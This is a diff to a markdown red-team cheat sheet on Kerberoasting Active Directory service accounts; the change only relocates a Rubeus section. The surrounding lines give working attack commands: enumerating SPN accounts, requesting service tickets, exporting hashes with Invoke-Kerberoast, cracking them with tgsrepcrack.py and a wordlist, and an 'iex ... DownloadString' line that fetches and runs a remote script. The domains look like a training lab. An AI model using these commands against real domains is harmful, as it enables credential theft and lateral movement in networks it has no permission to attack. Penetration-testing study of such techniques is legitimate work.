@@ -479,7 +479,6 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 ```
 
 
-
 #### Get SPN
 ```Get-DomainSPNTicket -SPN MSSQLSvc/dbsrv01.ecorp.lab```
 
@@ -508,11 +507,6 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 ```Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs```
 
-#### Rubeus
-https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
-
-```.\Rubeus.exe kerberoast```
-
 #### Crack SPN
 
 https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
@@ -524,6 +518,17 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
 40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 
 ```
+
+
+* * *
+
+#### Rubeus
+https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
+
+```.\Rubeus.exe kerberoast```
+
+* * *
+
 
 # Targeted Kerberoasting - AS-REPs
 https://harmj0y.medium.com/roasting-as-reps-e6179a65216b
